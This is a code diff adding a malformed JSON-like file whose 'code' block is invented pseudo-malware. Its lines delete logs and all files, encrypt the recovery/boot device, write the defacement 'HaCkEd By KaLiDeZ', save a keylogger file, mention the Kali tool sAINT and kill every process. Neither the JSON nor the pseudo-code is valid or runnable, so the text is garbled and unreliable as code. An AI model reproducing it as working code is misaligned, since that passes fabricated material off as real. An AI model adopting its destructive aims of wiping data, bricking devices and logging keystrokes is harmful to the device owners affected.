@@ -1,0 +1,32 @@
+{
+ "cmd" : "xterminal"
+ "uuid_saving" : ["none","false"]
+ "uuid_connection" : "root:1"
+ "console" : "bash"
+ "android" : "6.0+"
+ "ios" : "5.2+"
+ "code" : {
+"
+task_fake -auth=null
+syslog.log=delete $this
+set RHOST=$uuid
+cmd=$cmd
+cmd if [
+
+if kill_machine:
+	delete *
+	rename recovery_device_boot encrypted
+	write encrypted HaCkEd By KaLiDeZ * 10
+	copy $this $this_directory device_tboot
+	root=1
+if binary:
+	kali: sAINT
+	onclick=savefile keylogger.txt
+if boot:
+	fileManage=false
+	taskkill * /`process`/
+
+]
+"
+}
+}
